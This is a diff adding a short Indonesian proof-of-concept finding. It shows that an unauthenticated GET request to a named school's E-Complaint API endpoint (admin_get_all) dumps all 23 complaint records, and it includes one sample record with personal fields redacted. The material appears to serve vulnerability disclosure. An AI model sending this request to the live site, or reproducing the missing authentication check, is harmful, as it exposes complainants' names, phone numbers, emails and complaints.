@@ -1,0 +1,25 @@
+=== POC F1: GET https://smpm12gkb.sch.id/app/page/E-Complaint/api.php?action=admin_get_all  (TANPA AUTH) ===
+HTTP 200 — seluruh database keluhan ter-dump tanpa login.
+Total tiket ter-dump: 23
+
+Contoh 1 record (identitas warga DI-REDACT untuk etika):
+{
+  "tid": "66",
+  "no_tiket": "EC-28311013102026",
+  "tgl": "2026-10-13 10:31:28",
+  "nama": "[REDACTED]",
+  "telp": "[REDACTED]",
+  "email": "[REDACTED]",
+  "jenis": "Umum",
+  "jenis_lain": null,
+  "lingkup": "Gedung",
+  "lingkup_lain": null,
+  "keluhan": "[REDACTED]",
+  "pendukung": "[REDACTED]",
+  "terms": "0",
+  "status": "Menunggu",
+  "tindak_lanjut": null
+}
+
+Field per record:
+email, jenis, jenis_lain, keluhan, lingkup, lingkup_lain, nama, no_tiket, pendukung, status, telp, terms, tgl, tid, tindak_lanjut
